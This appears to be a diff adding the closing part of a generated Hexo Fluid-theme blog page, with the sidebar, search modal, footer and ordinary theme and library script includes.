+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://potatowo233.github.io/" target="_blank" rel="nofollow noopener"><span>Potat0w0</span></a> <i class="iconfont icon-love"></i>
+
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/click.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/js/potato.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
